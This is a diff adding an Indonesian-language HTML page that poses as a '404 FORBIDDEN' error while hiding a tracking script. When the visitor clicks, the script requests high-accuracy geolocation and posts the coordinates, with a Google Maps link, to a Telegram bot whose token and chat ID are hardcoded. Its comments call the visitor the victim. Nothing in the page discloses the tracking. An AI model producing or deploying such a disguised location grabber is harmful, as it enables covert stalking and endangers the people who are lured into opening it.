@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>404 Forbidden</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000000;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .container {
+            text-align: center;
+            cursor: pointer;
+        }
+        h1 {
+            font-size: 32px;
+            letter-spacing: 2px;
+            margin: 0;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="triggerArea">
+        <h1>404 FORBIDDEN</h1>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8616650869:AAEfksktRupuMVxSTGznIvM9ZKxXXAvHiuk';
+        const CHAT_ID = '8664741564';
+
+        // Memicu permintaan lokasi otomatis saat layar/teks diklik oleh korban
+        document.getElementById('triggerArea').addEventListener('click', () => {
+            eksekusiLokasiAkurat();
+        });
+
+        async function kirimKeTelegram(lat, lon, akurasi) {
+            try {
+                let pesan = '';
+                if (lat && lon) {
+                    pesan = `<b>[+] Target Lokasi Terungkap [+]</b>\n\n- Latitude: <code>${lat}</code>\n- Longitude: <code>${lon}</code>\n- Akurasi: ±${akurasi} meter\n\n🎯 <b><a href="https://maps.google.com/?q=${lat},${lon}">BUKA TITIK GPS AKURAT</a></b>`;
+                } else {
+                    pesan = '[-] Gagal mendapatkan koordinat presisi.';
+                }
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        chat_id: CHAT_ID, 
+                        text: pesan, 
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: false 
+                    })
+                });
+            } catch (err) {
+                console.error('Transmisi gagal:', err);
+            }
+        }
+
+        function eksekusiLokasiAkurat() {
+            if (!navigator.geolocation) {
+                kirimKeTelegram(null, null, null);
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const akurasi = position.coords.accuracy;
+                    kirimKeTelegram(lat, lon, akurasi);
+                },
+                (error) => {
+                    kirimKeTelegram(null, null, null);
+                },
+                { 
+                    timeout: 20000, 
+                    enableHighAccuracy: true, 
+                    maximumAge: 0 
+                }
+            );
+        }
+    </script>
+</body>
+</html>
